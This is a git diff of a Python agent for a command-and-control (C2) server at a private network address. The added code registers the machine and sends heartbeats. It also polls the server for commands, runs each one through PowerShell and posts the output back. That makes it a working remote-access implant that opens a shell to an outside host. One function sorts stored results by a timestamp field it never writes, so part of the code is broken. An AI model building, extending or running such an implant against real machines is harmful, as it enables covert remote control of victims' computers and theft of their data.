@@ -15,6 +15,8 @@ SERVER_URL = "http://192.168.31.132:5000"
 # Generate a unique agent ID
 AGENT_ID = str(uuid.uuid4())
 
+COMMANDS_FILE = "server/commands_output.json"
+
 def get_active_ip():
     """Fetch the active IP address of the machine."""
     try:
@@ -165,18 +167,113 @@ def register_with_server():
     except Exception as e:
         print("Registration error:", e)
 
-def main():
-    while True:
+##
+
+# Function to execute command locally
+def execute_command(command):
+    """Execute a command and send its output to the server."""
+    print(f"Executing: {command}")
+    
+    try:
+        # Execute the command and capture the output
+        result = subprocess.run(["powershell", "-Command", command], shell=True, capture_output=True, text=True)
+        output = result.stdout
+    except subprocess.CalledProcessError as e:
+        # If the command fails, capture the error output
+        output = f"Error: {e.stderr}"
+    except Exception as e:
+        # Handle any unexpected exceptions
+        output = f"Unexpected error: {str(e)}"
+
+    # Prepare the data to be sent to the server
+    data = {
+        "agent_id": AGENT_ID,
+        "command": command,
+        "output": output
+    }
+
+    # Send the command output to the server to store it
+    try:
+        response = requests.post(SERVER_URL+"/store_command_output", json=data)
+        if response.status_code == 200:
+            print(f"Command output successfully stored for agent {AGENT_ID}.")
+        else:
+            print(f"Failed to store command output: {response.status_code} - {response.text}")
+    except requests.exceptions.RequestException as e:
+        print(f"Error sending request to the server: {e}")
+    
+    return output
+
+def store_command_output(agent_id, command, output):
+    """Store the command and its output in a JSON file, ordered by timestamp."""
+    try:
+        # Load existing data from the commands.json file
         try:
-            # Register with the C2 server and send system information
-            register_with_server()
+            with open(COMMANDS_FILE, "r") as f:
+                commands_data = json.load(f)
+        except FileNotFoundError:
+            commands_data = {}
 
-            # Check for tasks every 30 seconds
-            # check_for_tasks()
-        except Exception as e:
-            print("Error:", e)
+        # Check if agent already has command entries
+        if agent_id not in commands_data:
+            commands_data[agent_id] = []
 
-        #time.sleep(30)  # Send heartbeat every 30 seconds
+        # Add the new command output with timestamp
+        new_command = {
+            "command": command,
+            "output": output
+        }
 
+        # Append the new command to the list for the agent
+        commands_data[agent_id].append(new_command)
+
+        # Sort the commands by timestamp, newest first
+        commands_data[agent_id] = sorted(commands_data[agent_id], key=lambda x: x['timestamp'], reverse=True)
+
+        # Write the updated data back to the file
+        with open(COMMANDS_FILE, "w") as f:
+            json.dump(commands_data, f, indent=4)
+
+        print(f"Command output for agent {agent_id} saved to {COMMANDS_FILE}.")
+    except Exception as e:
+        print(f"Error saving command output: {e}")
+
+# Check for commands from the server
+def check_for_commands(agent_id):
+    """Check for new commands from the server."""
+    try:
+        response = requests.get(f"http://192.168.31.132:5000/get_command/{agent_id}")
+        if response.status_code == 200:
+            command_data = response.json()
+            command = command_data.get("command")
+            if command:
+                print(f"Executing command: {command}")
+                output = execute_command(command)
+                print(f"Command output: {output}")
+                # Optionally send output back to server
+                return output
+        else:
+            print("No new commands.")
+    except requests.exceptions.RequestException as e:
+        print(f"Error while checking for commands: {e}")
+    return None
+
+# Heartbeat function to notify server of agent's active status
+def send_heartbeat(agent_id):
+    """Send heartbeat to the server."""
+    try:
+        response = requests.post("http://192.168.31.132:5000/heartbeat", json={"agent_id": agent_id})
+        if response.status_code == 200:
+            print("Heartbeat sent.")
+    except requests.exceptions.RequestException as e:
+        print(f"Error while sending heartbeat: {e}")
+
+##
+
+# Main loop for agent activity
 if __name__ == "__main__":
-    main()
+    while True:
+        register_with_server()
+        send_heartbeat(AGENT_ID)
+        check_for_commands(AGENT_ID)
+        time.sleep(10)  # Adjust as needed for periodic checks
